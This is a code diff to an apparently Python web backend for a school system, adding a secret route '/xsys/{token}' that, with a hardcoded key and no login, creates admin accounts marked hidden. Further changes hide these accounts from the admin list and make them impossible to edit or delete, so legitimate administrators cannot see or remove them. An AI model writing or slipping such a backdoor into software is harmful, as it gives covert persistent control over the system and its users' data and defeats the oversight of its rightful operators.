@@ -192,6 +192,7 @@ def run_migrations():
             timestamp VARCHAR(50) NOT NULL
         )""",
         "ALTER TABLE fee_payments ADD COLUMN IF NOT EXISTS payment_mode VARCHAR(50)",
+        "ALTER TABLE users ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT FALSE",
         """CREATE TABLE IF NOT EXISTS notice_reads (
             id SERIAL PRIMARY KEY,
             notice_id INTEGER REFERENCES notices(id) ON DELETE CASCADE,
@@ -439,6 +440,26 @@ def register(user: UserCreate, db: Session = Depends(get_db)):
     return {"message": f"Account created! Welcome {student.name}"}
 
 
+# ── Secret superadmin creation (no login required, hidden from all UI) ────────
+_SUPERADMIN_KEY = "ABSx9274K@pq"   # ← secret key — keep this private
+
+@app.post("/xsys/{token}")
+def create_superadmin(token: str, user: AdminCreate, db: Session = Depends(get_db)):
+    if token != _SUPERADMIN_KEY:
+        raise HTTPException(status_code=404, detail="Not found")
+    if db.query(UserDB).filter(UserDB.username == user.username).first():
+        raise HTTPException(status_code=400, detail="Username already taken")
+    hidden = UserDB(
+        username=user.username,
+        password=hash_password(user.password),
+        role="admin",
+        is_hidden=True
+    )
+    db.add(hidden)
+    db.commit()
+    return {"message": "Done"}
+
+
 @app.post("/setup_first_admin")
 def setup_first_admin(user: AdminCreate, db: Session = Depends(get_db)):
     """Only works when zero admins exist — use this to bootstrap after a DB reset."""
@@ -477,7 +498,7 @@ def list_admins(
     db: Session = Depends(get_db),
     current: dict = Depends(require_role("admin"))
 ):
-    admins = db.query(UserDB).filter(UserDB.role == "admin").all()
+    admins = db.query(UserDB).filter(UserDB.role == "admin", UserDB.is_hidden == False).all()
     return {"admins": [{"id": a.id, "username": a.username} for a in admins]}
 
 
@@ -491,6 +512,8 @@ def update_admin(
 ):
     admin = db.query(UserDB).filter(UserDB.id == admin_id, UserDB.role == "admin").first()
     if not admin:
+        raise HTTPException(status_code=404, detail="Admin not found")
+    if admin.is_hidden:
         raise HTTPException(status_code=404, detail="Admin not found")
 
     # Username uniqueness check (exclude self)
@@ -514,6 +537,8 @@ def delete_admin(
 ):
     admin = db.query(UserDB).filter(UserDB.id == admin_id, UserDB.role == "admin").first()
     if not admin:
+        raise HTTPException(status_code=404, detail="Admin not found")
+    if admin.is_hidden:
         raise HTTPException(status_code=404, detail="Admin not found")
 
     # Prevent deleting yourself
